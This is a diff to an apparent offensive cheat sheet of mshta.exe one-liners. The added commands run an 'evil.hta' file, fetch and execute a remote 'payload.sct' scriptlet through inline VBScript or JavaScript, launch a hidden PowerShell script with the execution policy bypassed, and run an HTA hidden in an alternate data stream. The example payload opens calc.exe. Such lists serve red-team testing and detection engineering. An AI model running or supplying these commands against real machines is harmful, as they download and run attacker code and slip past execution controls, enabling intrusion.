@@ -1,4 +1,15 @@
-# MSHTA Exec PS1 File:
+# Exec HTA file embedded JavaScript, JScript, or VBScript.
+mshta.exe evil.hta
 
-mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -ExecutionPolicy Bypass & 'C:\PATH\test.ps1'"", 0:close")
-//test.ps1 => Start-Process -FilePath "calc.exe"
+# Exec VBScript supplied as a command line argument.
+mshta.exe vbscript:Close(Execute("GetObject(""script:https://127.0.0.1/payload.sct"")"))
+
+# Exec PS1 file:
+mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -ExecutionPolicy Bypass & 'C:\ProgramData\payload.ps1'"", 0:close") //test.ps1 => Start-Process -FilePath "calc.exe"
+
+# Exc JavaScript supplied as a command line argument.
+mshta.exe javascript:a=GetObject("script:https://127.0.0.1/payload.sct").Exec();close();
+
+# Alternate data streams
+# Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
+mshta.exe "C:\ProgramData\Document.txt:payload.hta"
